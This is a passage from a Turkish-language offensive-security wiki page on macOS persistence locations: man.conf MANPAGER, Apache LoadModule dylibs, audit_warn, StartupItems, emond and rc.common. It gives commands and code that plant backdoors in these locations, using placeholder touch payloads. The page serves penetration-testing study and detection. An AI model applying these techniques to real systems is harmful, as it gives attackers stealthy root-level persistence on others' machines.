security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**, yetkilendirme çerçevesine yetkilendirme için **harici bir mekanizmayı çağırması** gerektiğini bildirir. Ayrıca, **`privileged`** bunun root tarafından çalıştırılmasını sağlar.

Bunu şu şekilde tetikleyin:
```bash
security authorize com.asdf.asdf
```
Ve ardından **staff grubunun sudo** erişimine sahip olması gerekir (`/etc/sudoers` dosyasını okuyarak doğrulayın).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Sandbox'ı atlatmak için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Root gerekli
- **`/private/etc/man.conf`**: man kullanıldığında

#### Açıklama & Exploit

Yapılandırma dosyası **`/private/etc/man.conf`**, man belge dosyalarını açarken kullanılacak binary/script'i belirtir. Dolayısıyla executable dosyanın yolu değiştirilebilir; böylece kullanıcı man ile bazı dokümanları okuduğunda bir backdoor çalıştırılır.

Örneğin **`/private/etc/man.conf`** içine şu satırı koyun:
```
MANPAGER /tmp/view
```
Ve sonra `/tmp/view` dosyasını şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Sandbox'ı atlatmak için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir ve apache çalışıyor olmalıdır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd'nin entitlements'ı bulunmuyor

#### Konum

- **`/etc/apache2/httpd.conf`**
- Root gerekli
- Tetikleyici: Apache2 başlatıldığında

#### Açıklama & Exploit

`/etc/apache2/httpd.conf` dosyasında bir modül yüklemek için şu gibi bir satır ekleyebilirsiniz:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek gereken ya **geçerli bir Apple sertifikasıyla imzalamanız**, ya da sistemde **yeni bir güvenilir sertifika ekleyip** onunla **imzalamanız**.

Ardından, gerekirse sunucunun başlatılacağından emin olmak için şu komutu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Sandbox'ı atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız, auditd'in çalışıyor olması ve bir uyarı oluşturmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
- Root gerekli
- **Tetikleyici**: auditd bir uyarı algıladığında

#### Açıklama & Exploit

auditd bir uyarı algıladığında **`/etc/security/audit_warn`** betiği **çalıştırılır**. Bu yüzden payload'unuzu buraya ekleyebilirsiniz.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n` ile bir uyarı tetikleyebilirsiniz.

### Başlangıç Öğeleri

> [!CAUTION] > **Bu kullanımdan kaldırılmıştır, bu nedenle bu dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem** dizini `/Library/StartupItems/` veya `/System/Library/StartupItems/` içinde bulunmalıdır. Bu dizin oluşturulduktan sonra iki belirli dosyayı içermelidir:

1. Bir **rc script**: Başlangıçta çalıştırılan bir shell script.
2. Bir **plist file**: adı `StartupParameters.plist` olan ve çeşitli yapılandırma ayarları içeren bir dosya.

Başlangıç sürecinin bunları tanıyıp kullanabilmesi için hem rc script hem de `StartupParameters.plist` dosyasının **StartupItem** dizini içinde doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni kendi macOS'umda bulamıyorum, daha fazla bilgi için yazıya bakın

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple tarafından tanıtılan **emond**, gelişmemiş ya da muhtemelen terkedilmiş gibi görünen ancak hâlâ erişilebilir durumda olan bir günlükleme mekanizmasıdır. Bir Mac yöneticisi için pek faydalı olmasa da, bu belirsiz servis threat actors için çoğu macOS yöneticisinin fark etmeyeceği ince bir persistence yöntemi olarak kullanılabilir.

Varlığının farkında olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek basittir. Servisin system LaunchDaemon'ı, çalıştırılacak scriptleri tek bir dizinde arar. Bunu incelemek için şu komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Yazı: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root gerekli
- **Tetikleyici**: With XQuartz

#### Açıklama & Exploit

XQuartz **artık macOS'ta yüklü değil**, daha fazla bilgi için writeup'a bakın.

### ~~kext~~

> [!CAUTION]
> Kext'i root olarak bile kurmak o kadar karmaşık ki, bunu escape from sandboxes veya persistence için düşünmeyeceğim (unless you have an exploit)

#### Konum

Bir KEXT'i startup item olarak yüklemek için, **aşağıdaki konumlardan birine** kurulmuş olması gerekir:

- `/System/Library/Extensions`
- OS X işletim sistemine entegre KEXT dosyaları.
- `/Library/Extensions`
- Üçüncü taraf yazılım tarafından kurulan KEXT dosyaları

Mevcut yüklü kext dosyalarını şu komutla listeleyebilirsiniz:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Yazı: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Konum

- **`/usr/local/bin/amstoold`**
- Root required

#### Açıklama ve İstismar

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist` bu ikiliyi kullanıyor ve bir XPC servisi açıyordu... sorun şu ki ikili mevcut değildi, bu yüzden oraya bir şey yerleştirebiliyordunuz ve XPC servisi çağrıldığında sizin ikiliniz çağrılacaktı.

Artık kendi macOS'ımda bunu bulamıyorum.

### ~~xsanctl~~

Yazı: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root required
- **Tetikleyici**: Servis çalıştırıldığında (nadiren)

#### Açıklama ve İstismar

Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve ben bile kendi macOS'ımda bunu bulamadım, daha fazla bilgi istiyorsanız yazıya bakın.

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya ayrıca **başlangıçta çalıştırılacak komutlar** yerleştirmek de mümkün. Örnek olarak normal bir rc.common script'i:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence teknikleri ve araçlar

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Kaynaklar

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
